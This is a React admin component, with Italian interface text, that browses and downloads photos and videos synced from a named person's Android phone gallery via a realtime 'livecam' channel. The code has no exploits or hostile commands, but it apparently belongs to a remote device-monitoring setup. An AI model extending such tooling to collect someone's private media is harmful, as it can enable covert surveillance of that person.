import { useEffect, useState } from "react";
import { Download, FolderOpen, Image, Loader2, RefreshCw, Video } from "lucide-react";
import { toast } from "sonner";
import { api } from "@/lib/api";
import { ensureRealtime, onRealtime } from "@/lib/livecam-signaling";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import { AdminMediaThumb } from "@/components/AdminMediaThumb";

type DeviceFile = {
  id: string;
  folderPath: string;
  originalFilename: string;
  mimeType: string;
  size: number;
  createdAt: string;
};

type FolderGroup = { path: string; files: DeviceFile[] };

function fmtSize(n: number) {
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(1)} MB`;
}

function isImage(m: string) {
  return m.startsWith("image/");
}

function isVideo(m: string) {
  return m.startsWith("video/");
}

function pickDefaultFolder(folders: FolderGroup[]): string | null {
  const paths = folders.map((f) => f.path);
  const byPath = new Map(folders.map((f) => [f.path, f]));
  const priority = ["/Device/Photos", "/Device/Videos", "/Photos", "/Videos", "/Audio"];
  for (const p of priority) {
    const group = byPath.get(p);
    if (group && group.files.length > 0) return p;
  }
  const firstNonEmpty = folders.find((f) => f.files.length > 0);
  if (firstNonEmpty) return firstNonEmpty.path;
  if (paths.includes("/Device/Photos")) return "/Device/Photos";
  if (paths.includes("/Photos")) return "/Photos";
  return paths[0] ?? null;
}

function mediaUrl(id: string, download = false) {
  const q = `id=${encodeURIComponent(id)}`;
  return download ? `/api/v1/admin/files/content/download?${q}` : `/api/v1/admin/files/content?${q}`;
}

export function AdminFilesPanel() {
  const [folders, setFolders] = useState<FolderGroup[]>([]);
  const [selected, setSelected] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [syncing, setSyncing] = useState(false);
  const total = folders.reduce((n, f) => n + f.files.length, 0);

  async function load() {
    setLoading(true);
    try {
      const data = await api<{ folders: FolderGroup[]; total: number }>("/api/v1/admin/files");
      setFolders(data.folders ?? []);
      setSelected((cur) => {
        const paths = (data.folders ?? []).map((f) => f.path);
        if (cur && paths.includes(cur)) return cur;
        return pickDefaultFolder(data.folders ?? []);
      });
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Could not load files");
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    ensureRealtime();
    void load();
    const off = onRealtime((msg) => {
      if (msg.type === "files.sync_start") {
        setSyncing(true);
        return;
      }
      if (msg.type === "files.sync_done") {
        setSyncing(false);
        void load();
        return;
      }
      if (msg.type !== "files.new") return;
      const f = msg.payload as DeviceFile;
      const file = { ...f, id: String(f.id) };
      setFolders((prev) => {
        const next = [...prev];
        const idx = next.findIndex((x) => x.path === file.folderPath);
        if (idx >= 0) {
          if (next[idx]!.files.some((x) => x.id === file.id)) return prev;
          next[idx] = { path: file.folderPath, files: [file, ...next[idx]!.files] };
        } else {
          next.push({ path: file.folderPath, files: [file] });
          next.sort((a, b) => a.path.localeCompare(b.path));
        }
        return next;
      });
      setSelected((cur) => cur ?? file.folderPath);
    });
    return off;
  }, []);

  const active = folders.find((f) => f.path === selected) ?? folders[0];

  return (
    <div className="flex h-full min-h-0 flex-1 flex-col bg-black/40 p-4 md:p-6">
      <div className="mb-4 flex flex-wrap items-center gap-3">
        <FolderOpen className="h-5 w-5 text-violet-400" />
        <div>
          <h1 className="font-serif text-2xl text-pink-100">Cartelle</h1>
          <p className="text-xs text-pink-300/80">Chat + galleria dispositivo (cartelle Device/Photos e Device/Videos).</p>
        </div>
        <span className="ml-auto rounded-full bg-zinc-800 px-3 py-1 text-xs text-pink-300/70">
          {syncing ? "Dua sta sincronizzando…" : `${total} file${total === 1 ? "" : "s"}`}
        </span>
      </div>
      <div className="mb-3 flex flex-wrap gap-2">
        <Button type="button" size="sm" variant="secondary" className="rounded-full" onClick={() => void load()} disabled={loading}>
          <RefreshCw className={cn("mr-1.5 h-4 w-4", loading && "animate-spin")} />
          Refresh
        </Button>
      </div>
      <div className="grid min-h-0 flex-1 gap-3 md:grid-cols-[220px_1fr]">
        <div className="min-h-0 overflow-y-auto rounded-2xl border border-pink-500/20 bg-zinc-950/80 p-2">
          {folders.length === 0 && !loading && (
            <p className="p-3 text-xs text-pink-300/60">
              Vuoto. Dua deve aprire l&apos;app Android (non Chrome), fare login, premere Consenti nel dialog di sistema.
            </p>
          )}
          {folders.map((f) => (
            <button
              key={f.path}
              type="button"
              onClick={() => setSelected(f.path)}
              className={cn(
                "mb-1 w-full rounded-xl px-3 py-2 text-left text-xs transition",
                selected === f.path ? "bg-violet-500/20 text-violet-200" : "text-pink-200/70 hover:bg-pink-500/10",
                f.path.startsWith("/Device") && f.files.length === 0 && "opacity-60",
              )}
            >
              <div className="truncate font-medium">
                {f.path === "/" ? "Root" : f.path.replace(/^\//, "")}
                {f.path.startsWith("/Device") && <span className="ml-1 text-[9px] text-violet-300/80">tel</span>}
              </div>
              <div className="text-[10px] opacity-70">{f.files.length} items</div>
            </button>
          ))}
        </div>
        <div className="min-h-0 overflow-y-auto rounded-2xl border border-pink-500/20 bg-zinc-950/80 p-3">
          {loading && !active && (
            <div className="grid h-full place-items-center text-sm text-pink-300/60">
              <Loader2 className="h-6 w-6 animate-spin" />
            </div>
          )}
          {!active && !loading && <p className="text-sm text-pink-300/60">Select a folder to browse and download.</p>}
          {active && active.files.length === 0 && !loading && (
            <div className="grid h-full min-h-[200px] place-items-center p-6 text-center">
              <p className="max-w-sm text-sm text-pink-300/70">
                {active.path.startsWith("/Device")
                  ? "Galleria telefono vuota. Apri l'app Android, login come dua, premi Consenti quando compare il permesso di sistema."
                  : "Questa cartella è vuota."}
              </p>
            </div>
          )}
          {active && active.files.length > 0 && (
            <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:grid-cols-4">
              {active.files.map((file) => (
                <div key={file.id} className="overflow-hidden rounded-xl border border-pink-500/15 bg-black/40">
                  <a href={mediaUrl(file.id)} target="_blank" rel="noreferrer" className="block">
                    <div className="relative aspect-square bg-zinc-900">
                      {isImage(file.mimeType) || isVideo(file.mimeType) ? (
                        <AdminMediaThumb id={file.id} mimeType={file.mimeType} className="h-full w-full object-cover" />
                      ) : (
                        <div className="grid h-full place-items-center text-pink-400/40">
                          <Image className="h-8 w-8" />
                        </div>
                      )}
                      {isVideo(file.mimeType) && (
                        <span className="absolute bottom-2 right-2 rounded bg-black/60 p-1">
                          <Video className="h-3 w-3 text-white" />
                        </span>
                      )}
                    </div>
                  </a>
                  <div className="flex items-start gap-1 p-2">
                    <div className="min-w-0 flex-1">
                      <p className="truncate text-[11px] text-pink-100">{file.originalFilename}</p>
                      <p className="text-[10px] text-pink-400/60">{fmtSize(file.size)}</p>
                    </div>
                    <a
                      href={mediaUrl(file.id, true)}
                      download={file.originalFilename}
                      className="grid h-8 w-8 shrink-0 place-items-center rounded-full bg-violet-500/20 text-violet-200 hover:bg-violet-500/40"
                      title="Download"
                    >
                      <Download className="h-3.5 w-3.5" />
                    </a>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
